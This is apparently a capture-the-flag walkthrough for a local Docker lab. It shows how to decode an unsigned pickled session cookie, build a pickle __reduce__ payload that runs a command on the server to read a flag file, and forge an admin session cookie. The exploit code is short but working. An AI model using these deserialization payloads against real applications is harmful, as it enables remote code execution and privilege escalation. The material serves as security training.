# Walkthrough

This document gives the complete solution. Work through the docs first.

## Setup

```bash
docker compose up --build -d
```

Wait 10 to 20 seconds, then verify:

```bash
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8082/login
```

Expected: `200`.

## Understand the session format

Log in as alice and decode the session cookie:

```bash
curl -c /tmp/jar -sf -X POST http://127.0.0.1:8082/login \
  -d "username=alice&password=alice123" -o /dev/null
grep session /tmp/jar | awk '{print $NF}' | python3 -c "
import sys, pickle, base64
print(pickle.loads(base64.b64decode(sys.stdin.read().strip())))
"
```

Output:

```python
{'username': 'alice', 'role': 'user'}
```

The session is a pickled dict with no signature.

## flag1: pickle RCE

```python
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag1.txt'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

```bash
curl -b "session=$PAYLOAD" http://127.0.0.1:8082/
```

**flag1** is in the "Server output" block on the returned page.

## flag2: forged admin session

```python
import pickle, base64

cookie = base64.b64encode(pickle.dumps({"username": "hacker", "role": "admin"})).decode()
print(cookie)
```

```bash
curl -b "session=$COOKIE" http://127.0.0.1:8082/admin
```

**flag2** appears in the admin panel under the "flag2:" label.

## Automated

```bash
python3 exploit/exploit.py
```

## Teardown

```bash
docker compose down
```
